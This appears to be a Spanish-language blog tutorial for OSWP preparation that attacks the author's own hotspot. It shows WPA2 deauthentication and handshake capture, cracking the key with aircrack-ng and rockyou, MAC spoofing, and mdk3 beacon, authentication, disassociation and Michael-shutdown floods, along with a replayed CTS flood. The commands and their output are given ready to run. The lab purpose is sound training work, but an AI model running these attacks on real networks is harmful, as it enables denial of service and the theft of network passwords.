---
layout: single
title: Hacking Wifi WPA2 
excerpt: "En este post vamos a estar haciendo algunos ataques conocidos para el protocolo WPA2 para prepararnos para el OSWP vamos a estarnos montando un AP desde nuestro dispositivo movil para asociar clientes y empezar con los ataques a este protocolo"
date: 2023-10-17
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/hacking-writeup-wifi/portal.png
  teaser_home_page: true
categories:
  - Hacking Wifi
tags:  
  - Hacking Wifi 
  - WPA2
  - OSWP
---



>Como ya sabemos necesitas una antena que acepte modo monitor en el anterior post deje el link de una antena que recomiendo al igual que muchas personas en este post nos vamos a estar enfocando en **WPA/WPA2**, los puntos de acceso los estaremos montando desde nuestro celular como en el post anterior simplemente indicando la contraseña y que es **WPA o WPA2**
>

## Modo monitor 

Vamos a conectar nuestra antena en mi caso ya estaría recuerda que tu antena puede tener un nombre diferente

```bash
❯ ifconfig wlx9cefd5f91ec0
wlx9cefd5f91ec0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 5a:46:ba:ee:43:6e  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Y bueno ahora vamos a poner la antena en modo monitor para poder desplegar los ataques

```bash
❯ airmon-ng start wlx9cefd5f91ec0

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    675 NetworkManager
    685 wpa_supplicant

PHY	Interface	Driver		Chipset

phy0	wlx9cefd5f91ec0	rt2800usb	Ralink Technology, Corp. RT5572
Interface wlx9cefd5f91ec0mon is too long for linux so it will be renamed to the old style (wlan#) name.

		(mac80211 monitor mode vif enabled on [phy0]wlan0mon
		(mac80211 station mode vif disabled for [phy0]wlx9cefd5f91ec0)
```

Ahora como vemos ya esta en modo monitor 

```bash
❯ ifconfig wlan0mon
wlan0mon: flags=4098<BROADCAST,MULTICAST>  mtu 1500
        unspec 9C-EF-D5-F9-1E-C0-D8-AA-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Cuando iniciamos el modo monitor con `airmon-ng` vemos 2 procesos conflictivos que necesitamos matar por detras son los que nos permiten estar conectados a una red inalambrica y nos otorga una **IP** por **DHCP** 

Cuando estamos en modo monitor perdemos conectividad a internet a si que como son conflictivos los procesos vamos a matar estos procesos para no tener inconvenientes

```bash
❯ killall dhclient wpa_supplicant
```

## Falsificación de la dirección MAC 

Pues bueno aunque no tengamos **IP** por que estamos en modo monitor seguimos teniendo la dirección **MAC** ala hora de desplegar los ataques pueden quedar registros que relacionen nuestro dispositivo a si que lo que podemos hacer es falsificar nuestra dirección **MAC** lo único es que tenemos que dar de baja la antena en modo monitor ya que no podemos cambiar la **MAC** mientras este activa a si que vamos a darla de baja

```bash
❯ ifconfig wlan0mon down
```

Para cambiar la **MAC** vamos a usar `macchanger` aquí vemos los parámetros de la herramienta

```bash
❯ macchanger --help
GNU MAC Changer
Usage: macchanger [options] device

  -h,  --help                   Print this help
  -V,  --version                Print version and exit
  -s,  --show                   Print the MAC address and exit
  -e,  --ending                 Don't change the vendor bytes
  -a,  --another                Set random vendor MAC of the same kind
  -A                            Set random vendor MAC of any kind
  -p,  --permanent              Reset to original, permanent hardware MAC
  -r,  --random                 Set fully random MAC
  -l,  --list[=keyword]         Print known vendors
  -b,  --bia                    Pretend to be a burned-in-address
  -m,  --mac=XX:XX:XX:XX:XX:XX
       --mac XX:XX:XX:XX:XX:XX  Set the MAC XX:XX:XX:XX:XX:XX

Report bugs to https://github.com/alobbs/macchanger/issues
```

Como tal podemos ver que esta es nuestra actual dirección **MAC** en base al **OUI** se puede saber que es o a quien pertenece un dispositivo en este caso no me lo detecta por que no sabe 

```bash
❯ macchanger -s wlan0mon
Current MAC:   9c:ef:d5:f9:1e:c0 (unknown)
Permanent MAC: 9c:ef:d5:f9:1e:c0 (unknown)
```

Una ejemplo es este aquí vemos el **OUI** de **Vmware**

```bash
❯ macchanger -l | grep -i vmware
1386 - 00:05:69 - VMware, Inc.
3086 - 00:0c:29 - VMware, Inc.
7161 - 00:1c:14 - VMware, Inc
10601 - 00:50:56 - VMware, Inc.
```

Podemos asignarnos una dirección **MAC** aleatoria o una en especifica para asignarnos una aleatoria se hace de la siguiente forma

```bash
❯ macchanger -a wlan0mon
Current MAC:   9c:ef:d5:f9:1e:c0 (unknown)
Permanent MAC: 9c:ef:d5:f9:1e:c0 (unknown)
New MAC:       00:06:47:93:d7:70 (Etrali S.A.)
```

Ahora tenemos la **MAC** de **Etrali S.A.** 

```bash
❯ macchanger -s wlan0mon
Current MAC:   00:06:47:93:d7:70 (Etrali S.A.)
Permanent MAC: 9c:ef:d5:f9:1e:c0 (unknown)
```

Podemos asignarnos una **MAC** en especifica en este caso a mi me interesa asignarme esta **MAC** para hacerme pasar por la **DEA**

```bash
❯ macchanger -l | grep -i "Dea Security"
5383 - 00:15:22 - Dea Security
```

Para hacerlo simplemente le asignamos el **OUI**  y algo aleatorio

```bash
❯ macchanger --mac="00:15:22:ad:bc:21" wlan0mon
Current MAC:   00:06:47:93:d7:70 (Etrali S.A.)
Permanent MAC: 9c:ef:d5:f9:1e:c0 (unknown)
New MAC:       00:15:22:ad:bc:21 (Dea Security)
```

Ahora vamos a dar de alta la tarjeta de red 

```bash
❯ ifconfig wlan0mon up
```

Ahora vemos que tenemos la de la **Dea**

```bash
❯ macchanger -s wlan0mon
Current MAC:   00:15:22:ad:bc:21 (Dea Security)
Permanent MAC: 9c:ef:d5:f9:1e:c0 (unknown)
```

Si quieres restablecer todo a como estaba por defecto es muy fácil recuerda que primeramente tenemos que darla de baja para que pueda funcionar

```bash
❯ ifconfig wlan0mon down
```

Y ahora hacemos lo siguiente

```bash
❯ macchanger -p wlan0mon
Current MAC:   00:15:22:ad:bc:21 (Dea Security)
Permanent MAC: 9c:ef:d5:f9:1e:c0 (unknown)
New MAC:       9c:ef:d5:f9:1e:c0 (unknown)
❯ ifconfig wlan0mon up
❯ airmon-ng stop wlan0mon

PHY	Interface	Driver		Chipset

phy0	wlan0mon	rt2800usb	Ralink Technology, Corp. RT5572
		(mac80211 station mode vif enabled on [phy0]wlan0)
		(mac80211 monitor mode vif disabled for [phy0]wlan0mon)
```

Ahora lo necesitamos reiniciar este servicio

```bash
❯ /etc/init.d/networking restart
Restarting networking (via systemctl): networking.service.
```

Y bueno después de volver a poner la tarjeta en modo monitor otra vez vemos que ahora tiene la dirección **MAC** original puedes cambiarla otra vez pero en mi caso no lo haré por que todos los ataques los estaremos haciendo en local y no atacando a alguna red que no nos pertenece en ese caso si no la cambiáramos

```bash
❯ macchanger -s wlan0mon
Current MAC:   9c:ef:d5:f9:1e:c0 (unknown)
Permanent MAC: 9c:ef:d5:f9:1e:c0 (unknown)
```

## Analizando el entorno

Ahora lo que vamos a hacer es ver las redes inalambricas que están disponibles en el entorno para hacerlo simplemente ejecutamos lo siguiente 

```bash
❯ airodump-ng wlan0mon
```

Ahora lo que vamos a hacer es ver las redes inalambricas que están disponibles en el entorno para hacerlo simplemente ejecutamos lo siguiente 

```bash
❯ airodump-ng wlan0mon
```

Ahora lo que vamos a hacer es ver las redes inalambricas que están disponibles en el entorno para hacerlo simplemente ejecutamos lo siguiente 

```bash
❯ airodump-ng wlan0mon
```

Hay podemos ver en mi caso las redes inalambricas en mi entorno disponibles recordar que el **ESSID** es el nombre de la red wifi el **BSSID** es la dirección **MAC** del punto de acceso el **PWR** es para que tan cerca esta de nosotros entre mas cerca estemos mejor 

![](/assets/images/hacking-writeup-wifi/web1.png)

Lo que hecho ahora es crearme un punto de acceso desde el celular que lo tengo alado para que vean que vamos a tener esta red muy cerca si volvemos a ejecutar `airodump-ng wlan0mon` la veremos ademas sabemos que la autenticación es **PSK** ya que tenemos que proporcionar una contraseña para poder conectarnos

![](/assets/images/hacking-writeup-wifi/web2.png)

Bueno algo a saber es la que la sección de abajo corresponde a los clientes que están conectanos a un punto de acceso

**STATION** es un cliente puede ser un celular un ordenador o lo que sea y el **BSSID** nos dice que esta asociado a ese punto de acceso vemos que el punto de acceso termina en **94:E4** y si nos fijamos corresponde a **Totalplay-E39F** que es de algún vecino quiero pensar el **PWR** es **-1** pero la red esta algo alejada de mi, los **Frames** entre mas valla aumentando ese significa que el cliente esta activo en la red, cuando nos dice **<length: 0>** es que la red esta oculta

![](/assets/images/hacking-writeup-wifi/web3.png)

Lo que podemos hacer es filtrar directamente por una red en especifico con el **CH** y el **ESSID**

```bash
❯ airodump-ng -c 1 --essid MiguelWifi wlan0mon
```

Hay vemos muchos clientes asociados a otros AP y 1 al nuestro

![](/assets/images/hacking-writeup-wifi/web4.png)

Si aumentan los **Frames** sabemos que el cliente esta activo si expulsamos a un cliente de la red estaremos haciendo un ataque de desautenticacion para cuando se reconecte de forma automática capturar el hash podemos guardar todo en una captura (cambie el canal por que cambie el punto de acceso)

```bash
❯ airodump-ng -c 6 -w Captura --essid MiguelWifi wlan0mon
```

Vemos todo el trafico

![](/assets/images/hacking-writeup-wifi/web5.png)

Si paramos esto y hacemos un `ls` vemos las capturas

```bash
❯ ll
.rw-r--r-- root root  18 KB Wed Aug 30 12:27:14 2023  Captura-01.cap
.rw-r--r-- root root 2.0 KB Wed Aug 30 12:27:16 2023  Captura-01.csv
.rw-r--r-- root root 590 B  Wed Aug 30 12:27:16 2023  Captura-01.kismet.csv
.rw-r--r-- root root  29 KB Wed Aug 30 12:27:16 2023  Captura-01.kismet.netxml
.rw-r--r-- root root 449 KB Wed Aug 30 12:27:16 2023  Captura-01.log.csv
```

La mas interesante es la **.cap** ya que hay es donde esta el **handshake** y toda la información importante

```bash
❯ file *
Captura-01.cap:           pcap capture file, microsecond ts (little-endian) - version 2.4 (802.11, capture length 65535)
Captura-01.csv:           ASCII text, with CRLF line terminators
Captura-01.kismet.csv:    ASCII text, with very long lines, with CRLF, LF line terminators
Captura-01.kismet.netxml: XML 1.0 document, ASCII text
Captura-01.log.csv:       CSV text
```

## Ataque para capturar el Handshake (Deautenticación dirigido)

Este es una de los ataques mas comunes 

Vamos a seguir monitoreando el trafico de la red que creamos

```bash
❯ airodump-ng -c 6 -w Captura --essid MiguelWifi wlan0mon
```

![](/assets/images/hacking-writeup-wifi/webnew.png)

Este es el equipo que quiero expulsar de la red **80:30:49:81:DC:AD** (Estos ataques solo funcionan para **(WPA/WPA2**) de autenticacion **PSK** los de usuario y contraseña son otro tipo de ataque 

Vamos a usar `aireplay-ng`

```bash
❯ aireplay-ng --help | tail -n 13
      --deauth      count : deauthenticate 1 or all stations (-0)
      --fakeauth    delay : fake authentication with AP (-1)
      --interactive       : interactive frame selection (-2)
      --arpreplay         : standard ARP-request replay (-3)
      --chopchop          : decrypt/chopchop WEP packet (-4)
      --fragment          : generates valid keystream   (-5)
      --caffe-latte       : query a client for new IVs  (-6)
      --cfrag             : fragments against a client  (-7)
      --migmode           : attacks WPA migration mode  (-8)
      --test              : tests injection and quality (-9)

      --help              : Displays this usage screen
```

El **-0** nos permite deautenticar una estación de una red inalambrica lo vamos a expulsar para que cuando se vuelva a conectar se genere el **handshake** y lo podamos capturar 

Vamos a emitir 10 paquetes de deautenticacion del punto de acceso

```bash
❯ aireplay-ng -0 15 -e MiguelWifi -c 80:30:49:81:DC:AD wlan0mon
03:21:06  Waiting for beacon frame (ESSID: MiguelWifi) on channel 1
Found BSSID "C6:BF:FD:55:E2:F7" to given ESSID "MiguelWifi".
03:21:07  Sending 64 directed DeAuth (code 7). STMAC: [80:30:49:81:DC:AD] [ 0|47 ACKs]
03:21:07  Sending 64 directed DeAuth (code 7). STMAC: [80:30:49:81:DC:AD] [38|72 ACKs]
03:21:08  Sending 64 directed DeAuth (code 7). STMAC: [80:30:49:81:DC:AD] [63|68 ACKs]
03:21:08  Sending 64 directed DeAuth (code 7). STMAC: [80:30:49:81:DC:AD] [61|57 ACKs]
03:21:09  Sending 64 directed DeAuth (code 7). STMAC: [80:30:49:81:DC:AD] [70|75 ACKs]
03:21:10  Sending 64 directed DeAuth (code 7). STMAC: [80:30:49:81:DC:AD] [61|64 ACKs]
03:21:10  Sending 64 directed DeAuth (code 7). STMAC: [80:30:49:81:DC:AD] [61|84 ACKs]
03:21:11  Sending 64 directed DeAuth (code 7). STMAC: [80:30:49:81:DC:AD] [61|63 ACKs]
03:21:12  Sending 64 directed DeAuth (code 7). STMAC: [80:30:49:81:DC:AD] [61|81 ACKs]
03:21:12  Sending 64 directed DeAuth (code 7). STMAC: [80:30:49:81:DC:AD] [58|79 ACKs]
03:21:13  Sending 64 directed DeAuth (code 7). STMAC: [80:30:49:81:DC:AD] [63|64 ACKs]
03:21:14  Sending 64 directed DeAuth (code 7). STMAC: [80:30:49:81:DC:AD] [42|67 ACKs]
03:21:14  Sending 64 directed DeAuth (code 7). STMAC: [80:30:49:81:DC:AD] [60|64 ACKs]
03:21:15  Sending 64 directed DeAuth (code 7). STMAC: [80:30:49:81:DC:AD] [47|72 ACKs]
03:21:16  Sending 64 directed DeAuth (code 7). STMAC: [80:30:49:81:DC:AD] [31|75 ACKs]
```

Esto lo que hice fue expulsar al cliente de la red y ahora ya capturamos el **Handshake** ya se conecte automáticamente

![](/assets/images/hacking-writeup-wifi/web7new.png)

Procedemos a crackear para ver la contraseña 

```bash
❯ aircrack-ng -w /usr/share/wordlists/rockyou.txt Captura-02.cap
Reading packets, please wait...
Opening Captura-02.cap
Read 6933 packets.


                               Aircrack-ng 1.6 

      [00:00:00] 115/10303727 keys tested (576.74 k/s) 

      Time left: 4 hours, 57 minutes, 45 seconds                 0.00%

      [00:00:00] 299/10303727 keys tested (880.17 k/s) 

      Time left: 3 hours, 15 minutes, 6 seconds                  0.00%

      [00:00:00] 451/10303727 keys tested (915.48 k/s) 

      Time left: 3 hours, 7 minutes, 34 seconds                  0.00%

      [00:00:01] 555/10303727 keys tested (928.10 k/s) 

      Time left: 3 hours, 5 minutes, 1 second                    0.01%

                       Current passphrase: manchester                 


      Master Key     : 55 01 AE 01 39 05 DF 0B 58 9B EF 29 56 27 80 10 
                          KEY FOUND! [ manchester ]
      Transient Key  : 51 23 B5 F0 A5 9A CA 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
      EAPOL HMAC     : 92 E5 79 A4 74 0A 86 69 6E C2 3E 53 7B 76 17 CC 
```

## Ataque de De-Autenticacion Global

Bueno para este ataque vamos a seguir monitorisando el punto de acceso que creamos desde nuestro celular para eso seguimos los mismos conceptos, para ver los clientes conectados

![](/assets/images/hacking-writeup-wifi/web8.png)

Pero lo que ahora queremos hacer es expulsar a todos los clientes de la red

Para expulsar a todos los clientes de la red la dirección **MAC** del dispositivo a atacar y esa **MAC** es `FF:FF:FF:FF:FF:FF` esta dirección **MAC** es la dirección **Broadcast**, la cual hace referencia a todos los clientes que están en la red, al expulsar a todos tenemos mas tasa de éxito ya que la mayoría de clientes se van a volver a desconectar y cunado uno se reconecte tenemos un **Handshake** valido

Antes de hacer el ataque no tenemos ningún **Handshake**

![](/assets/images/hacking-writeup-wifi/web9.png)

Ahora si lo iniciamos los dispositivos se van a desconectar y cuando uno se reconecte capturaremos el **Handshake**

```bash
❯ aireplay-ng -0 15 -e MiguelWifi -c FF:FF:FF:FF:FF:FF wlan0mon
```

![](/assets/images/hacking-writeup-wifi/web10new.png)

Esta es otra forma

```bash
❯ aireplay-ng -0 15 -e MiguelWifi wlan0mon
```

Si lo que queremos hacer es que ningún cliente se conecte podemos enviar paquetes infinitos

```bash
❯ aireplay-ng -0 0 -e MiguelWifi wlan0mon
```

## Ataque de Autenticación

Este ataque nos va a permitir autenticar a un cliente a una red inalambrica o a un punto de acceso si vemos el panel de ayuda de `aireplay-ng` vemos que nos dicen sobre **fakeauth** 

Un ejemplo rápida para comprender este concepto es que mediante un **AP** que tenemos vamos a conectar un cliente suponiendo que no hay ningún cliente conectado al **AP**

```bash
❯ airodump-ng --bssid C6:BF:FD:55:E2:F7 --channel 10 wlan0mon
```

Si nos podemos a capturar vemos que de momento no hay ningún cliente asociado 

![](/assets/images/hacking-writeup-wifi/web11.png)

Para autenticar a un cliente debemos proporcionar su dirección **MAC** yo por ejemplo voy a autenticar una laptop que tengo alado para practicar en este laboratorio y me se su dirección **MAC** , no le vamos a indicar paquetes si no que de manera ilimitada asta que se asocie termine

```bash
❯ aireplay-ng -1 0 -e MiguelWifi -h 00:26:6c:1f:03:d8 wlan0mon
The interface MAC (9C:EF:D5:F9:1E:C0) doesn't match the specified MAC (-h).
	ifconfig wlan0mon hw ether 00:26:6C:1F:03:D8
18:37:14  Waiting for beacon frame (ESSID: MiguelWifi) on channel 10
Found BSSID "C6:BF:FD:55:E2:F7" to given ESSID "MiguelWifi".

18:37:14  Sending Authentication Request (Open System)

18:37:16  Sending Authentication Request (Open System) [ACK]
18:37:16  Authentication successful
18:37:16  Sending Association Request [ACK]
18:37:16  Association successful :-) (AID: 1)
```

Ahora vemos que como tal el cliente esta autenticado

![](/assets/images/hacking-writeup-wifi/web12.png)

>Si expulsamos al cliente y tratamos de hacer una reconexión manual no va a generar ningun **handshake** por que todo esto es falso en la autenticación el cliente no dispone de la contraseña de la red es por eso que no va a viajar la contraseña por que es una falsa autenticación.

# Inyectar clientes de manera agresiva (Autenticación masiva)

Algo que podemos hacer es que con `mdk3` podemos hacer este tipo de ataque donde de forma agresiva va a inyectar demasiados clientes a una red inalambrica con esto lo que conseguimos es que al estar demasiados clientes se van a expulsar algunos por que va a estar saturada la red y cuando se reconecte podremos capturar el **handshake** es una forma como esta saturada la red se desconecta y se reasocia despues , solo le indicaremos la **MAC** de **AP**

```bash
❯ mdk3 wlan0mon a -a C6:BF:FD:55:E2:F7
```

Y se inyectan demasiados clientes tu puedes parar el ataque asta cuando quieras con un `CTRL+C`

![](/assets/images/hacking-writeup-wifi/web14.png)

## CTS Frame attack 

>Este ataque no suele salir ala primera y se necesita de algo de paciencia 

Este ataque lo que nos permite es dejar una red inalambrica inoperativa durante un largo periodo de tiempo esto nos permite dejar la red saturada para que los clientes sean expulsados y cuando se vuelvan a conectar automáticamente obtener el **handshake**

Lo primero que vamos a hacer es abrir `wireshark`

```bash
❯ wireshark &>/dev/null & disown 
```

Vamos a seleccionar esa interfaz

![](/assets/images/hacking-writeup-wifi/web15.png)

Una vez establecido eso vemos que como tal hay demasiados paquetes y como tal hay podemos ver nuestro **AP**

![](/assets/images/hacking-writeup-wifi/web16.png)

> El paquete CTS o **Clear-to-send** esta formado por **14 Bytes** donde se incluye, **Frame Control**, la duración de la reserva, **Dirección MAC de la estación que recibirá el paquete**  y finalmente el **Frame Check Sequence (FCS)** es para comprobar la integridad de la trama.

![](/assets/images/hacking-writeup-wifi/CTS.png)

![](/assets/images/hacking-writeup-wifi/FCS.png)

Vamos a hacerlo para entenderlo mejor, vamos a filtrar por los paquetes **CTS**

![](/assets/images/hacking-writeup-wifi/web17.png)

Si queremos ver todo esto de mejor forma y ver mas información desde consola también podemos usar `tshark`, vamos a exportarlo a un `.cap`

```bash
❯ tshark -w Captura.cap 2>/dev/null
```

Ahora nos ponemos en escucha con `airodump-ng` para poder capturar mas rápido y esperamos unos segundos antes de hacer `ctrl+c`

![](/assets/images/hacking-writeup-wifi/web18.png)

Otra forma es especificando directamente la interfaz

![](/assets/images/hacking-writeup-wifi/web19.png)

Si filtramos por lo mismo que en `wireshark` vemos que ya lo tenemos

![](/assets/images/hacking-writeup-wifi/web20.png)

Hay vemos el campo que nos interesa 

![](/assets/images/hacking-writeup-wifi/web21.png)

Si queremos verlo desde `wireshark` estos serian

![](/assets/images/hacking-writeup-wifi/web22.png)

Vamos a seleccionar un paquete cualquiera en mi caso seria el **19** y vamos a darle en **files** y vamos a seleccionar la opción para guardar un paquete en especifico 

![](/assets/images/hacking-writeup-wifi/web23.png)

```bash
❯ file ataquects.pcap
ataquects.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (802.11 with radiotap header, capture length 262144)
```

Por aquí vemos el campo que nos interesa 

```bash
❯ tshark -r ataquects.pcap -Tfields -e wlan.duration 2>/dev/null
270
```

Vamos abrir la captura 

![](/assets/images/hacking-writeup-wifi/web24.png)

Estos valores corresponden ala **MAC** del punto de acceso

![](/assets/images/hacking-writeup-wifi/web25.png)

Y esto corresponde al tiempo en micro-segundos que esta en **0** **xd** esta en **little endian** puedes convertirlo a decimal con **Python**

![](/assets/images/hacking-writeup-wifi/web26.png)

Bueno lo mas probable es que si elegimos otro paquete que no se hizo al **AP** por eso el tiempo sea diferente pero bueno sigamos

Nosotros como atacantes podemos establecer el tiempo máximo que son **30K**

```bash
❯ python
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> hex(30000)
'0x7530'
>>> 
```

Pero hay que darle la vuelta entonces quedaría **3075** 

![](/assets/images/hacking-writeup-wifi/web27.png)

Ahora vamos a establecer la dirección **MAC** del **AP**

![](/assets/images/hacking-writeup-wifi/web28.png)

Ahora lo guardamos y lo abrimos con `wireshark`

Bueno como tal tuve unos pequeños inconvenientes y tuve que usar otro paquete pero para hacer el ataque simplemente hacemos lo siguiente

Con `tcpreplay` indicándole la tarjeta de red en modo monitor a máxima velocidad le indicamos los **loops** para que haga 10K de iteraciones y le indicamos el paquete para que lo repita

```bash
❯ tcpreplay --intf1=wlan0mon --topspeed --loop=10000 ya.pcap 2>/dev/null
Actual: 10000 packets (280000 bytes) sent in 19.25 seconds
Rated: 14539.0 Bps, 0.116 Mbps, 519.25 pps
Statistics for network device: wlan0mon
	Successful packets:        10000
	Failed packets:            0
	Truncated packets:         0
	Retried packets (ENOBUFS): 0
	Retried packets (EAGAIN):  0
```

Lo que deberíamos de ver en nuestros dispositivos es que la señal de tu wifi las rayitas tienen que disminuir ya que secuestraste de tal manera el ancho de banda, si lo que quieres es el **handshake** simplemente te pones con `airodump-ng` para capturarlo cuando el cliente se reasocie.

## Beacon Flood Mode Attack 

Para empezar el **Beacon** es un tipo de paquete que contiene informacion sobre el punto de acceso informacion sobre el canal en el que esta, el tipo de encriptado, el nombre y esas cosas.

Una forma de ver los paquetes es con `tshark` podemos filtrar directamente por esos paquetes mientras en otra terminal nos ponemos a monitorear con `airodump-ng`

![](/assets/images/hacking-writeup-wifi/web29.png)

Con la herramienta `mdk3` podemos generar este ataque esto lo que consigue es generar muchos paquetes de tipo **Beacon** vamos a generar demasiados **AP** en el mismo canal donde se sitúa el **AP** que tenemos para que la red se quede inoperativa para los clientes

Vamos a generar los nombres de los **AP** que vamos a generar

```bash
❯ for i in $(seq 1 10); do echo "WifiFree$i" >> names.txt; done
❯ catn names.txt
WifiFree1
WifiFree2
WifiFree3
WifiFree4
WifiFree5
WifiFree6
WifiFree7
WifiFree8
WifiFree9
WifiFree10
```

Ahora con la herramienta `mdk3` vamos a hacer el siguiente ataque 

```bash
❯ mdk3 --help

MDK 3.0 v6 - "Yeah, well, whatever"
by ASPj of k2wrlz, using the osdep library from aircrack-ng
And with lots of help from the great aircrack-ng community:
Antragon, moongray, Ace, Zero_Chaos, Hirte, thefkboss, ducttape,
telek0miker, Le_Vert, sorbo, Andy Green, bahathir and Dawid Gajownik
THANK YOU!

MDK is a proof-of-concept tool to exploit common IEEE 802.11 protocol weaknesses.
IMPORTANT: It is your responsibility to make sure you have permission from the
network owner before running MDK against it.

This code is licenced under the GPLv2

MDK USAGE:
mdk3 <interface> <test_mode> [test_options]

Try mdk3 --fullhelp for all test options
Try mdk3 --help <test_mode> for info about one test only

TEST MODES:
b   - Beacon Flood Mode
      Sends beacon frames to show fake APs at clients.
      This can sometimes crash network scanners and even drivers!
```

Ahora simplemente le pasamos el nombre del fichero donde estan los nombres de los **AP** y el canal donde se situa el **AP** que queremos atacar y comenzamos el ataque

```bash
❯ mdk3 wlan0mon b -f names.txt -a -s 1000 -c 2
```

Ahora podemos ver como se crearon varios **AP** que fueron los que indicamos en el **names.txt** que están en el mismo canal estos se irán incrementando y va a saturar el **AP** victima ya que hay demasiados **AP** en el mismo canal

![](/assets/images/hacking-writeup-wifi/beacon.png)

Otra forma seria de esta manera el problema es que el **SSID** van a ser aleatorios el nombre no lo vamos a especificar nosotros y con esto se dañaría el espectro de onda de la red para que quede inoperativa

```bash
❯ mdk3 wlan0mon b -c 2
```

## Disassociation Amok Mode Attack 

Este ataque consiste básicamente en hacer un ataque de deautenticacion dirigido para poder hacer este ataque necesitamos crear un fichero con las direcciones **MAC** de los clientes a los cuales queremos deautenticar del **AP**

Si monitoreamos el **AP** en mi caso hay 2 clientes conectados al **AP**

![](/assets/images/hacking-writeup-wifi/d1.png)

En mi caso voy a indicar la direccion **MAC** **84:4B:F5:48:6C:CF** que es el cliente que quiero expulsar

```bash
❯ nvim blacklist
❯ catn blacklist
84:4B:F5:48:6C:CF
```

Ahora para hacer el ataque simplemente usamos la herramienta `mdk3`

```bash
❯ mdk3 wlan0mon d -w blacklist -c 1

Periodically re-reading blacklist/whitelist every 3 seconds
```

Todos los **AP** que operen en el canal 1 va a estar expulsando a todos los clientes que tengan esa dirección **MAC** que indicamos en el archivo **blacklist**

## Michael Shutdown Exploitation

Este ataque lo que nos permite es apagar un **router** el problema de este ataque es que no es muy efectivo no hay mucha documentación sobre este ataque 

![](/assets/images/hacking-writeup-wifi/d2.png)

Como vemos no hay mucha información sobre este ataque a si que vamos a hacerlo de todas formas para este ataque necesitamos la herramienta `mdk3`

Esto lo que hace es emitir los paquetes para que se apague el router pero no siempre funciona le vamos a indicar la dirección **MAC** del **AP**

```bash
❯ mdk3 wlan0mon m -t C6:BF:FD:55:E2:F7
```

## Ataques Pasivos

Bueno asta ahora hemos hecho ataques donde básicamente estamos deautenticando a los clientes del **AP** para que cuando se reconecten de forma automática al **AP** obtener el **Handshake** pero también hay una forma de básicamente obtener el **handshake** sin expulsar a nadie ya que cuando un dispositivo ya estuvo conectado al **AP** desde hace mucho cuando el dispositivo detecte la red wifi se va a conectar y si nosotros estamos en escucha en modo monitor vamos a capturar el **handshake** simplemente por que estamos escuchando  es una forma algo lenta por que tenemos que esperar a que se conecte o se reconecte pero bueno es igual funcional

## Modos de filtro con tshark

Bueno para esto recomiendo hacer un ataque de deautenticacion global para capturar el **handshake** y exportar

![](/assets/images/hacking-writeup-wifi/d3.png)

![](/assets/images/hacking-writeup-wifi/d4.png)

Cuando un dispositivo se conecta ala red emite el **Probe Request** para filtrar por ese paquete se hace de esta manera

```bash
❯ tshark -r Captura-01.cap -Y "wlan.fc.type_subtype==4" 2>/dev/null
```

Si queremos capturar esos paquetes podemos hacer lo siguiente

```bash
❯ tshark -i wlan0mon -Y "wlan.fc.type_subtype==4" 2>/dev/null
```

Y en una terminal por debajo vamos a ejecutar lo siguiente `airodump-ng wlan0mon`

![](/assets/images/hacking-writeup-wifi/d5.png)

Cuando el dispositivo emite un **Probe Request** hay un **Probe Response**

![](/assets/images/hacking-writeup-wifi/d6.png)

Después están los paquetes de asociación que son cuando el cliente se a tratado de asociar al **AP**  para filtrar por esos es de la siguiente forma 

![](/assets/images/hacking-writeup-wifi/d7.png)

También tenemos el **Association Response**

```bash
❯ tshark -r Captura-01.cap -Y "wlan.fc.type_subtype==1" 2>/dev/null
 7819 133.720190 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 129 Association Response, SN=3088, FN=0, Flags=........
```

Hay vemos un paquete **Beacon** que ya lo habíamos visto

```bash
❯ tshark -r Captura-01.cap -Y "wlan.fc.type_subtype==8" 2>/dev/null
    1   0.000000 c6:bf:fd:55:e2:f7 → Broadcast    802.11 281 Beacon frame, SN=1066, FN=0, Flags=........, BI=100, SSID="MiguelWifi"
```

Estos son los paquetes de autenticacion 

```bash
❯ tshark -r Captura-01.cap -Y "wlan.fc.type_subtype==11" 2>/dev/null
 6003 130.208233 1a:58:18:4e:8a:68 → c6:bf:fd:55:e2:f7 802.11 65 Authentication, SN=68, FN=0, Flags=........
 7806 133.704687 1a:58:18:4e:8a:68 → c6:bf:fd:55:e2:f7 802.11 65 Authentication, SN=4029, FN=0, Flags=........
 7809 133.708056 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, SN=3086, FN=0, Flags=........
34291 184.497250 1a:58:18:4e:8a:68 → c6:bf:fd:55:e2:f7 802.11 65 Authentication, SN=3285, FN=0, Flags=........
34297 184.501073 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, SN=3135, FN=0, Flags=........
34298 184.502776 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, SN=3135, FN=0, Flags=....R...
34299 184.502921 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, SN=3135, FN=0, Flags=....R...
34300 184.504065 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, SN=3135, FN=0, Flags=....R...
34301 184.504392 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, SN=3135, FN=0, Flags=....R...
34302 184.504766 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, SN=3135, FN=0, Flags=....R...
